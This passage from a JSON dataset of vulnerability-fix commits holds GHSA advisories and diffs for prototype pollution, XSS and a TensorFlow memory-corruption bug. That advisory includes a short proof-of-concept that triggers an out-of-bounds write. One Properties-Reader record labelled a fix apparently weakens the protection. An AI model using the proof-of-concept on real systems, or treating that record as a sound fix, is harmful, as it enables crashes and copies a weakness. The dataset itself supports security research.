            "files":"{'lib\/validate.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kriszyp\/json-schema\/raw\/b62f1da1ff5442f23443d6be6a92d00e65cba93a\/lib%2Fvalidate.js', 'patch': \"@@ -207,7 +207,7 @@ var validate = exports._validate = function(\/*Any*\/instance,\/*Object*\/schema,\/*O\\n \\t\\t\\t}\\n \\t\\t\\t\\n \\t\\t\\tfor(var i in objTypeDef){ \\n-\\t\\t\\t\\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__'){\\n+\\t\\t\\t\\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__' && i != 'constructor'){\\n \\t\\t\\t\\t\\tvar value = instance[i];\\n \\t\\t\\t\\t\\t\/\/ skip _not_ specified properties\\n \\t\\t\\t\\t\\tif (value === undefined && options.existingOnly) continue;\"}}",
            "message_norm":"protect against constructor modification, #84",
            "language":"en",
            "entities":"[('protect', 'SECWORD', ''), ('#84', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/validate.js'])",
            "num_files":1.0,
            "patch_content":"From b62f1da1ff5442f23443d6be6a92d00e65cba93a Mon Sep 17 00:00:00 2001\nFrom: Kris Zyp <kriszyp@gmail.com>\nDate: Mon, 1 Nov 2021 20:41:46 -0600\nSubject: [PATCH] Protect against constructor modification, #84\n\n---\n lib\/validate.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/lib\/validate.js b\/lib\/validate.js\nindex 99c9c9c..8992d6d 100644\n--- a\/lib\/validate.js\n+++ b\/lib\/validate.js\n@@ -207,7 +207,7 @@ var validate = exports._validate = function(\/*Any*\/instance,\/*Object*\/schema,\/*O\n \t\t\t}\n \t\t\t\n \t\t\tfor(var i in objTypeDef){ \n-\t\t\t\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__'){\n+\t\t\t\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__' && i != 'constructor'){\n \t\t\t\t\tvar value = instance[i];\n \t\t\t\t\t\/\/ skip _not_ specified properties\n \t\t\t\t\tif (value === undefined && options.existingOnly) continue;",
            "code_diff":"@@ -207,7 +207,7 @@ var validate = exports._validate = function(\/*Any*\/instance,\/*Object*\/schema,\/*O\n \t\t\t}\n \t\t\t\n \t\t\tfor(var i in objTypeDef){ \n-\t\t\t\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__'){\n+\t\t\t\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__' && i != 'constructor'){\n \t\t\t\t\tvar value = instance[i];\n \t\t\t\t\t\/\/ skip _not_ specified properties\n \t\t\t\t\tif (value === undefined && options.existingOnly) continue;"
        },
        {
            "index":139,
            "vuln_id":"GHSA-jxvf-m3x5-mxwq",
            "cwe_id":"{'CWE-1321'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/steveukx\/properties\/commit\/0877cc871db9865f58dd9389ce99e61be05380a5', 'https:\/\/github.com\/steveukx\/properties\/commit\/4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab'}",
            "dataset":"osv",
            "summary":"Properties-Reader before v2.2.0 vulnerable to prototype pollution Properties-Reader prior to version 2.2.0 is vulnerable to prototype pollution. Version 2.2.0 contains a patch for this issue.",
            "published_date":"2022-07-19",
            "chain_len":2,
            "project":"https:\/\/github.com\/steveukx\/properties",
            "commit_href":"https:\/\/github.com\/steveukx\/properties\/commit\/4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab",
            "commit_sha":"4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab",
            "patch":"MULTI",
            "chain_ord":"['0877cc871db9865f58dd9389ce99e61be05380a5', '4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab']",
            "before_first_fix_commit":"{'0877cc871db9865f58dd9389ce99e61be05380a5'}",
            "last_fix_commit":"4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab",
            "chain_ord_pos":2.0,
            "commit_datetime":"12\/30\/2020, 06:58:22",
            "message":"Allow for relying on Object prototype in steps of the expanded properties",
            "author":"Steve King",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'src\/properties-reader.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/steveukx\/properties\/raw\/4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab\/src%2Fproperties-reader.js', 'patch': '@@ -217,7 +217,7 @@ PropertiesReader.prototype.set = function (key, value) {\\n       }\\n \\n       if (!has(source, step)) {\\n-         Object.defineProperty(source, step, { value: Object.create(null) });\\n+         Object.defineProperty(source, step, { value: {} });\\n       }\\n \\n       source = source[step]'}}",
            "message_norm":"allow for relying on object prototype in steps of the expanded properties",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/properties-reader.js'])",
            "num_files":1.0,
            "patch_content":"From 4e4bc392ecfd0a128f48c1d69f64a0d7194fcaab Mon Sep 17 00:00:00 2001\nFrom: Steve King <steve@mydev.co>\nDate: Wed, 30 Dec 2020 08:58:22 +0200\nSubject: [PATCH] Allow for relying on Object prototype in steps of the\n expanded properties\n\n---\n src\/properties-reader.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/src\/properties-reader.js b\/src\/properties-reader.js\nindex 08ec72d..4a5be60 100644\n--- a\/src\/properties-reader.js\n+++ b\/src\/properties-reader.js\n@@ -217,7 +217,7 @@ PropertiesReader.prototype.set = function (key, value) {\n       }\n \n       if (!has(source, step)) {\n-         Object.defineProperty(source, step, { value: Object.create(null) });\n+         Object.defineProperty(source, step, { value: {} });\n       }\n \n       source = source[step]",
            "code_diff":"@@ -217,7 +217,7 @@ PropertiesReader.prototype.set = function (key, value) {\n       }\n \n       if (!has(source, step)) {\n-         Object.defineProperty(source, step, { value: Object.create(null) });\n+         Object.defineProperty(source, step, { value: {} });\n       }\n \n       source = source[step]"
        },
        {
            "index":926,
            "vuln_id":"GHSA-5x33-h32w-6vr2",
            "cwe_id":"{'CWE-79'}",
            "score":6.1,
            "chain":"{'https:\/\/github.com\/moodle\/moodle\/commit\/e8632a4ad0b4da3763cbbe5949594aa449b483bb'}",
            "dataset":"osv",
            "summary":"Cross site-scripting (XSS) moodle The filter in the tag manager required extra sanitizing to prevent a reflected XSS risk. This affects 3.9 to 3.9.1, 3.8 to 3.8.4, 3.7 to 3.7.7, 3.5 to 3.5.13 and earlier unsupported versions. Fixed in 3.9.2, 3.8.5, 3.7.8 and 3.5.14.",
            "published_date":"2021-03-29",
            "chain_len":1,
            "project":"https:\/\/github.com\/moodle\/moodle",
            "commit_href":"https:\/\/github.com\/moodle\/moodle\/commit\/e8632a4ad0b4da3763cbbe5949594aa449b483bb",
            "commit_sha":"e8632a4ad0b4da3763cbbe5949594aa449b483bb",
            "patch":"SINGLE",
            "chain_ord":"['e8632a4ad0b4da3763cbbe5949594aa449b483bb']",
            "before_first_fix_commit":"{'630078eb4a189a17378ea6cf19be989da2114c1c'}",
            "last_fix_commit":"e8632a4ad0b4da3763cbbe5949594aa449b483bb",
            "chain_ord_pos":1.0,
            "commit_datetime":"08\/04\/2020, 10:04:27",
            "message":"MDL-69340 tag: Correct the filter input HTML in the tag manager",
            "author":"Michael Hawkins",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'tag\/manage.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moodle\/moodle\/raw\/e8632a4ad0b4da3763cbbe5949594aa449b483bb\/tag%2Fmanage.php', 'patch': '@@ -211,7 +211,7 @@\\n print(\\'<div class=\"tag-management-form generalbox\"><label class=\"accesshide\" for=\"id_tagfilter\">\\'. get_string(\\'search\\') .\\'<\/label>\\'.\\n     \\'<input type=\"hidden\" name=\"tc\" value=\"\\'.$tagcollid.\\'\" \/>\\'.\\n     \\'<input type=\"hidden\" name=\"perpage\" value=\"\\'.$perpage.\\'\" \/>\\'.\\n-    \\'<input id=\"id_tagfilter\" name=\"filter\" type=\"text\" value=\\' . s($filter) . \\'>\\'.\\n+    \\'<input id=\"id_tagfilter\" name=\"filter\" type=\"text\" value=\"\\' . s($filter) . \\'\">\\'.\\n     \\'<input value=\"\\'. s(get_string(\\'search\\')) .\\'\" type=\"submit\" class=\"btn btn-secondary\"> \\'.\\n     ($filter !== \\'\\' ? html_writer::link(new moodle_url($PAGE->url, array(\\'filter\\' => null)),\\n         get_string(\\'resetfilter\\', \\'tag\\'), array(\\'class\\' => \\'resetfilterlink\\')) : \\'\\').'}}",
            "message_norm":"mdl-69340 tag: correct the filter input html in the tag manager",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tag\/manage.php'])",
            "num_files":1.0,
            "patch_content":"From e8632a4ad0b4da3763cbbe5949594aa449b483bb Mon Sep 17 00:00:00 2001\nFrom: Michael Hawkins <michaelh@moodle.com>\nDate: Tue, 4 Aug 2020 18:04:27 +0800\nSubject: [PATCH] MDL-69340 tag: Correct the filter input HTML in the tag\n manager\n\n---\n tag\/manage.php | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/tag\/manage.php b\/tag\/manage.php\nindex 3f757628c6f9e..b2d35df0e3e04 100644\n--- a\/tag\/manage.php\n+++ b\/tag\/manage.php\n@@ -211,7 +211,7 @@\n print('<div class=\"tag-management-form generalbox\"><label class=\"accesshide\" for=\"id_tagfilter\">'. get_string('search') .'<\/label>'.\n     '<input type=\"hidden\" name=\"tc\" value=\"'.$tagcollid.'\" \/>'.\n     '<input type=\"hidden\" name=\"perpage\" value=\"'.$perpage.'\" \/>'.\n-    '<input id=\"id_tagfilter\" name=\"filter\" type=\"text\" value=' . s($filter) . '>'.\n+    '<input id=\"id_tagfilter\" name=\"filter\" type=\"text\" value=\"' . s($filter) . '\">'.\n     '<input value=\"'. s(get_string('search')) .'\" type=\"submit\" class=\"btn btn-secondary\"> '.\n     ($filter !== '' ? html_writer::link(new moodle_url($PAGE->url, array('filter' => null)),\n         get_string('resetfilter', 'tag'), array('class' => 'resetfilterlink')) : '').",
            "code_diff":"@@ -211,7 +211,7 @@\n print('<div class=\"tag-management-form generalbox\"><label class=\"accesshide\" for=\"id_tagfilter\">'. get_string('search') .'<\/label>'.\n     '<input type=\"hidden\" name=\"tc\" value=\"'.$tagcollid.'\" \/>'.\n     '<input type=\"hidden\" name=\"perpage\" value=\"'.$perpage.'\" \/>'.\n-    '<input id=\"id_tagfilter\" name=\"filter\" type=\"text\" value=' . s($filter) . '>'.\n+    '<input id=\"id_tagfilter\" name=\"filter\" type=\"text\" value=\"' . s($filter) . '\">'.\n     '<input value=\"'. s(get_string('search')) .'\" type=\"submit\" class=\"btn btn-secondary\"> '.\n     ($filter !== '' ? html_writer::link(new moodle_url($PAGE->url, array('filter' => null)),\n         get_string('resetfilter', 'tag'), array('class' => 'resetfilterlink')) : '')."
        },
        {
            "index":2,
            "vuln_id":"GHSA-whr9-vfh2-7hm6",
            "cwe_id":"{'CWE-787'}",
            "score":4.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/79865b542f9ffdc9caeb255631f7c56f1d4b6517'}",
            "dataset":"osv",
            "summary":"Memory corruption in `DrawBoundingBoxesV2` ### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\nimages = tf.fill([10, 96, 0, 1], 0.)\nboxes = tf.fill([10, 53, 0], 0.)\ncolors = tf.fill([0, 1], 0.)\n\ntf.raw_ops.DrawBoundingBoxesV2(images=images, boxes=boxes, colors=colors)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/31bd5026304677faa8a0b77602c6154171b9aec1\/tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc#L116-L130) assumes that the last element of `boxes` input is 4, as required by [the op](https:\/\/www.tensorflow.org\/api_docs\/python\/tf\/raw_ops\/DrawBoundingBoxesV2). Since this is not checked attackers passing values less than 4 can write outside of bounds of heap allocated objects and cause memory corruption:\n\n```cc \nconst auto tboxes = boxes.tensor<T, 3>();\nfor (int64 bb = 0; bb < num_boxes; ++bb) {\n  ...\n  const int64 min_box_row = static_cast<float>(tboxes(b, bb, 0)) * (height - 1);\n  const int64 max_box_row = static_cast<float>(tboxes(b, bb, 2)) * (height - 1);\n  const int64 min_box_col = static_cast<float>(tboxes(b, bb, 1)) * (width - 1);\n  const int64 max_box_col = static_cast<float>(tboxes(b, bb, 3)) * (width - 1);\n  ...\n}\n``` \n\nIf the last dimension in `boxes` is less than 4, accesses similar to `tboxes(b, bb, 3)` will access data outside of bounds. Further during code execution there are also writes to these indices.\n\n### Patches\nWe have patched the issue in GitHub commit [79865b542f9ffdc9caeb255631f7c56f1d4b6517](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/79865b542f9ffdc9caeb255631f7c56f1d4b6517).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
            "published_date":"2021-05-21",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/79865b542f9ffdc9caeb255631f7c56f1d4b6517",
            "commit_sha":"79865b542f9ffdc9caeb255631f7c56f1d4b6517",
            "patch":"SINGLE",
            "chain_ord":"['79865b542f9ffdc9caeb255631f7c56f1d4b6517']",
            "before_first_fix_commit":"{'31bd5026304677faa8a0b77602c6154171b9aec1'}",
            "last_fix_commit":"79865b542f9ffdc9caeb255631f7c56f1d4b6517",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/05\/2021, 01:05:46",
            "message":"Fix memory corruption issue with `tf.raw_ops.DrawBoundingBoxesV2`.\n\nPiperOrigin-RevId: 372033910\nChange-Id: I8a9f4efc1c8ddaacbc26ec1fbe4bfdd6791c226d",
            "author":"Amit Patankar",
            "comments":null,
            "stats":"{'additions': 6, 'deletions': 0, 'total': 6}",
            "files":"{'tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/79865b542f9ffdc9caeb255631f7c56f1d4b6517\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fdraw_bounding_box_op.cc', 'patch': '@@ -73,6 +73,12 @@ class DrawBoundingBoxesOp : public OpKernel {\\n         errors::InvalidArgument(\"Channel depth should be either 1 (GRY), \"\\n                                 \"3 (RGB), or 4 (RGBA)\"));\\n \\n+    OP_REQUIRES(\\n+        context, boxes.dim_size(2) == 4,\\n+        errors::InvalidArgument(\\n+            \"The size of the third dimension of the box must be 4. Received: \",\\n+            boxes.dim_size(2)));\\n+\\n     const int64 batch_size = images.dim_size(0);\\n     const int64 height = images.dim_size(1);\\n     const int64 width = images.dim_size(2);'}}",
            "message_norm":"fix memory corruption issue with `tf.raw_ops.drawboundingboxesv2`.\n\npiperorigin-revid: 372033910\nchange-id: i8a9f4efc1c8ddaacbc26ec1fbe4bfdd6791c226d",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('memory corruption', 'SECWORD', ''), ('issue', 'FLAW', ''), ('372033910', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc'])",
            "num_files":1.0,
            "patch_content":"From 79865b542f9ffdc9caeb255631f7c56f1d4b6517 Mon Sep 17 00:00:00 2001\nFrom: Amit Patankar <amitpatankar@google.com>\nDate: Tue, 4 May 2021 18:05:46 -0700\nSubject: [PATCH] Fix memory corruption issue with\n `tf.raw_ops.DrawBoundingBoxesV2`.\n\nPiperOrigin-RevId: 372033910\nChange-Id: I8a9f4efc1c8ddaacbc26ec1fbe4bfdd6791c226d\n---\n tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc | 6 ++++++\n 1 file changed, 6 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc b\/tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc\nindex 73db76333f0862..926ea368a58ba8 100644\n--- a\/tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc\n+++ b\/tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc\n@@ -73,6 +73,12 @@ class DrawBoundingBoxesOp : public OpKernel {\n         errors::InvalidArgument(\"Channel depth should be either 1 (GRY), \"\n                                 \"3 (RGB), or 4 (RGBA)\"));\n \n+    OP_REQUIRES(\n+        context, boxes.dim_size(2) == 4,\n+        errors::InvalidArgument(\n+            \"The size of the third dimension of the box must be 4. Received: \",\n+            boxes.dim_size(2)));\n+\n     const int64 batch_size = images.dim_size(0);\n     const int64 height = images.dim_size(1);\n     const int64 width = images.dim_size(2);",
            "code_diff":"@@ -73,6 +73,12 @@ class DrawBoundingBoxesOp : public OpKernel {\n         errors::InvalidArgument(\"Channel depth should be either 1 (GRY), \"\n                                 \"3 (RGB), or 4 (RGBA)\"));\n \n+    OP_REQUIRES(\n+        context, boxes.dim_size(2) == 4,\n+        errors::InvalidArgument(\n+            \"The size of the third dimension of the box must be 4. Received: \",\n+            boxes.dim_size(2)));\n+\n     const int64 batch_size = images.dim_size(0);\n     const int64 height = images.dim_size(1);\n     const int64 width = images.dim_size(2);"
        },
        {
            "index":203,
            "vuln_id":"GHSA-5f38-9jw2-6r6h",
            "cwe_id":"{'CWE-79', 'CWE-843'}",
            "score":5.4,
            "chain":"{'https:\/\/github.com\/rooseveltframework\/teddy\/commit\/64c556717b4879bf8d4c30067cf6e70d899a3dc0'}",
            "dataset":"osv",
            "summary":"Cross-site Scripting in teddy Teddy is a readable and easy to learn templating language. This affects the package teddy before 0.5.9. A type confusion vulnerability can be used to bypass input sanitization when the model content is an array (instead of a string).",
            "published_date":"2021-10-12",
            "chain_len":1,
            "project":"https:\/\/github.com\/rooseveltframework\/teddy",
            "commit_href":"https:\/\/github.com\/rooseveltframework\/teddy\/commit\/64c556717b4879bf8d4c30067cf6e70d899a3dc0",
            "commit_sha":"64c556717b4879bf8d4c30067cf6e70d899a3dc0",
            "patch":"SINGLE",
            "chain_ord":"['64c556717b4879bf8d4c30067cf6e70d899a3dc0']",
            "before_first_fix_commit":"{'90387d97c7a8f458a08dd3b72a4b0574000af5f8', 'fea0b218069ff00f86f2b24f2fd08be01cd6b8c1'}",
            "last_fix_commit":"64c556717b4879bf8d4c30067cf6e70d899a3dc0",
            "chain_ord_pos":1.0,
            "commit_datetime":"10\/07\/2021, 01:27:38",
            "message":"Merge pull request #518 from kethinov\/refactor-escape-entities\n\nrefactor escape entities for better type checking",
            "author":"Eric Newport",
            "comments":null,
            "stats":"{'additions': 15, 'deletions': 4, 'total': 19}",
            "files":"{'utils.js': {'additions': 15, 'deletions': 4, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rooseveltframework\/teddy\/raw\/64c556717b4879bf8d4c30067cf6e70d899a3dc0\/utils.js', 'patch': \"@@ -96,10 +96,21 @@ function escapeEntities (value) {\\n   let i\\n   let j\\n \\n-  if (value === undefined || typeof value === 'boolean' || typeof value === 'object') { \/\/ Cannot escape on these values\\n-    return value\\n-  } else if (typeof value === 'number') { \/\/ Value is a number, no reason to escape\\n-    return `${value}`\\n+  if (typeof value === 'object') { \/\/ Cannot escape on this value\\n+    if (!value) {\\n+      return false \/\/ it is falsey to return false\\n+    } else if (Array.isArray(value)) {\\n+      if (value.length === 0) {\\n+        return false \/\/ empty arrays are falsey\\n+      } else {\\n+        return '[Array]' \/\/ print that it is an array with content in it, but do not print the contents\\n+      }\\n+    }\\n+    return '[Object]' \/\/ just print that it is an object, do not print the contents\\n+  } else if (value === undefined) { \/\/ Cannot escape on this value\\n+    return false \/\/ undefined is falsey\\n+  } else if (typeof value === 'boolean' || typeof value === 'number') { \/\/ Cannot escape on these values\\n+    return value \/\/ if it's already a boolean or a number just return it\\n   } else {\\n     \/\/ Loop through value to find HTML entities\\n     for (i = 0; i < value.length; i++) {\"}}",
            "message_norm":"merge pull request #518 from kethinov\/refactor-escape-entities\n\nrefactor escape entities for better type checking",
            "language":"en",
            "entities":"[('#518', 'ISSUE', ''), ('escape', 'SECWORD', ''), ('escape', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['utils.js'])",
            "num_files":1.0,
            "patch_content":"From f51225de37295e73306281246eed808bb9867288 Mon Sep 17 00:00:00 2001\nFrom: Eric Newport <kethinov@gmail.com>\nDate: Mon, 4 Oct 2021 13:32:14 -0400\nSubject: [PATCH 1\/5] refactor escape entities for better type checking\n\n---\n utils.js | 11 +++++++++--\n 1 file changed, 9 insertions(+), 2 deletions(-)\n\ndiff --git a\/utils.js b\/utils.js\nindex d8803272..7a2c3972 100644\n--- a\/utils.js\n+++ b\/utils.js\n@@ -96,8 +96,15 @@ function escapeEntities (value) {\n   let i\n   let j\n \n-  if (value === undefined || typeof value === 'boolean' || typeof value === 'object') { \/\/ Cannot escape on these values\n-    return value\n+  if (typeof value === 'object') { \/\/ Cannot escape on this value\n+    if (Array.isArray(value) && value.length === 0) {\n+      return false \/\/ empty arrays are falsey\n+    }\n+    return true \/\/ assumed to be truthy if something is in it\n+  } else if (value === undefined) { \/\/ Cannot escape on this value\n+    return false \/\/ undefined is falsey\n+  } else if (typeof value === 'boolean') { \/\/ Cannot escape on this value\n+    return value \/\/ it's already a boolean so just return the boolean\n   } else if (typeof value === 'number') { \/\/ Value is a number, no reason to escape\n     return `${value}`\n   } else {\n\nFrom 11c082c83d05ab1b359e8a51ef475604b149e742 Mon Sep 17 00:00:00 2001\nFrom: Eric Newport <kethinov@gmail.com>\nDate: Tue, 5 Oct 2021 13:37:33 -0400\nSubject: [PATCH 2\/5] remove unnecessary abstraction\n\n---\n utils.js | 6 ++----\n 1 file changed, 2 insertions(+), 4 deletions(-)\n\ndiff --git a\/utils.js b\/utils.js\nindex 7a2c3972..605c1f5b 100644\n--- a\/utils.js\n+++ b\/utils.js\n@@ -103,10 +103,8 @@ function escapeEntities (value) {\n     return true \/\/ assumed to be truthy if something is in it\n   } else if (value === undefined) { \/\/ Cannot escape on this value\n     return false \/\/ undefined is falsey\n-  } else if (typeof value === 'boolean') { \/\/ Cannot escape on this value\n-    return value \/\/ it's already a boolean so just return the boolean\n-  } else if (typeof value === 'number') { \/\/ Value is a number, no reason to escape\n-    return `${value}`\n+  } else if (typeof value === 'boolean' || typeof value === 'number') { \/\/ Cannot escape on these values\n+    return value \/\/ if it's already a boolean or a number just return it\n   } else {\n     \/\/ Loop through value to find HTML entities\n     for (i = 0; i < value.length; i++) {\n\nFrom 370c9abf6a15ed517d65e9a55cabc36911bbcd95 Mon Sep 17 00:00:00 2001\nFrom: Eric Newport <kethinov@gmail.com>\nDate: Tue, 5 Oct 2021 13:49:13 -0400\nSubject: [PATCH 3\/5] refactor to make output more clear\n\n---\n utils.js | 10 +++++++---\n 1 file changed, 7 insertions(+), 3 deletions(-)\n\ndiff --git a\/utils.js b\/utils.js\nindex 605c1f5b..00cb6761 100644\n--- a\/utils.js\n+++ b\/utils.js\n@@ -97,10 +97,14 @@ function escapeEntities (value) {\n   let j\n \n   if (typeof value === 'object') { \/\/ Cannot escape on this value\n-    if (Array.isArray(value) && value.length === 0) {\n-      return false \/\/ empty arrays are falsey\n+    if (Array.isArray(value)) {\n+      if (value.length === 0) {\n+        return false \/\/ empty arrays are falsey\n+      } else {\n+        return '[Array]' \/\/ print that it is an array with content in it, but do not print the contents\n+      }\n     }\n-    return true \/\/ assumed to be truthy if something is in it\n+    return '[Object]' \/\/ just print that it is an object, do not print the contents\n   } else if (value === undefined) { \/\/ Cannot escape on this value\n     return false \/\/ undefined is falsey\n   } else if (typeof value === 'boolean' || typeof value === 'number') { \/\/ Cannot escape on these values\n\nFrom 1b09ea8280875fdc1333a7a372774fcd90161a1f Mon Sep 17 00:00:00 2001\nFrom: Eric Newport <kethinov@gmail.com>\nDate: Tue, 5 Oct 2021 13:55:10 -0400\nSubject: [PATCH 4\/5] catch all falsey values\n\n---\n utils.js | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\ndiff --git a\/utils.js b\/utils.js\nindex 00cb6761..08188707 100644\n--- a\/utils.js\n+++ b\/utils.js\n@@ -97,7 +97,9 @@ function escapeEntities (value) {\n   let j\n \n   if (typeof value === 'object') { \/\/ Cannot escape on this value\n-    if (Array.isArray(value)) {\n+    if (!value) {\n+      return false \/\/ it is otherwise falsey\n+    } else if (Array.isArray(value)) {\n       if (value.length === 0) {\n         return false \/\/ empty arrays are falsey\n       } else {\n\nFrom fea0b218069ff00f86f2b24f2fd08be01cd6b8c1 Mon Sep 17 00:00:00 2001\nFrom: Eric Newport <kethinov@gmail.com>\nDate: Tue, 5 Oct 2021 13:56:04 -0400\nSubject: [PATCH 5\/5] clarify comment\n\n---\n utils.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/utils.js b\/utils.js\nindex 08188707..b81be34d 100644\n--- a\/utils.js\n+++ b\/utils.js\n@@ -98,7 +98,7 @@ function escapeEntities (value) {\n \n   if (typeof value === 'object') { \/\/ Cannot escape on this value\n     if (!value) {\n-      return false \/\/ it is otherwise falsey\n+      return false \/\/ it is falsey to return false\n     } else if (Array.isArray(value)) {\n       if (value.length === 0) {\n         return false \/\/ empty arrays are falsey",
            "code_diff":"@@ -96,8 +96,15 @@ function escapeEntities (value) {\n   let i\n   let j\n \n-  if (value === undefined || typeof value === 'boolean' || typeof value === 'object') { \/\/ Cannot escape on these values\n-    return value\n+  if (typeof value === 'object') { \/\/ Cannot escape on this value\n+    if (Array.isArray(value) && value.length === 0) {\n+      return false \/\/ empty arrays are falsey\n+    }\n+    return true \/\/ assumed to be truthy if something is in it\n+  } else if (value === undefined) { \/\/ Cannot escape on this value\n+    return false \/\/ undefined is falsey\n+  } else if (typeof value === 'boolean') { \/\/ Cannot escape on this value\n+    return value \/\/ it's already a boolean so just return the boolean\n   } else if (typeof value === 'number') { \/\/ Value is a number, no reason to escape\n     return `${value}`\n   } else {\n\nFrom: Eric Newport <kethinov@gmail.com>\n\n utils.js | 6 ++----\n 1 file changed, 2 insertions(+), 4 deletions(-)\n\n@@ -103,10 +103,8 @@ function escapeEntities (value) {\n     return true \/\/ assumed to be truthy if something is in it\n   } else if (value === undefined) { \/\/ Cannot escape on this value\n     return false \/\/ undefined is falsey\n-  } else if (typeof value === 'boolean') { \/\/ Cannot escape on this value\n-    return value \/\/ it's already a boolean so just return the boolean\n-  } else if (typeof value === 'number') { \/\/ Value is a number, no reason to escape\n-    return `${value}`\n+  } else if (typeof value === 'boolean' || typeof value === 'number') { \/\/ Cannot escape on these values\n+    return value \/\/ if it's already a boolean or a number just return it\n   } else {\n     \/\/ Loop through value to find HTML entities\n     for (i = 0; i < value.length; i++) {\n\nFrom: Eric Newport <kethinov@gmail.com>\n\n utils.js | 10 +++++++---\n 1 file changed, 7 insertions(+), 3 deletions(-)\n\n@@ -97,10 +97,14 @@ function escapeEntities (value) {\n   let j\n \n   if (typeof value === 'object') { \/\/ Cannot escape on this value\n-    if (Array.isArray(value) && value.length === 0) {\n-      return false \/\/ empty arrays are falsey\n+    if (Array.isArray(value)) {\n+      if (value.length === 0) {\n+        return false \/\/ empty arrays are falsey\n+      } else {\n+        return '[Array]' \/\/ print that it is an array with content in it, but do not print the contents\n+      }\n     }\n-    return true \/\/ assumed to be truthy if something is in it\n+    return '[Object]' \/\/ just print that it is an object, do not print the contents\n   } else if (value === undefined) { \/\/ Cannot escape on this value\n     return false \/\/ undefined is falsey\n   } else if (typeof value === 'boolean' || typeof value === 'number') { \/\/ Cannot escape on these values\n\nFrom: Eric Newport <kethinov@gmail.com>\n\n utils.js | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\n@@ -97,7 +97,9 @@ function escapeEntities (value) {\n   let j\n \n   if (typeof value === 'object') { \/\/ Cannot escape on this value\n-    if (Array.isArray(value)) {\n+    if (!value) {\n+      return false \/\/ it is otherwise falsey\n+    } else if (Array.isArray(value)) {\n       if (value.length === 0) {\n         return false \/\/ empty arrays are falsey\n       } else {\n\nFrom: Eric Newport <kethinov@gmail.com>\n\n utils.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n@@ -98,7 +98,7 @@ function escapeEntities (value) {\n \n   if (typeof value === 'object') { \/\/ Cannot escape on this value\n     if (!value) {\n-      return false \/\/ it is otherwise falsey\n+      return false \/\/ it is falsey to return false\n     } else if (Array.isArray(value)) {\n       if (value.length === 0) {\n         return false \/\/ empty arrays are falsey"
        },
        {
            "index":826,
            "vuln_id":"GHSA-f4rr-5m7v-wxcw",
            "cwe_id":"{'CWE-843'}",
            "score":5.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b917181c29b50cb83399ba41f4d938dc369109a1'}",
            "dataset":"osv",
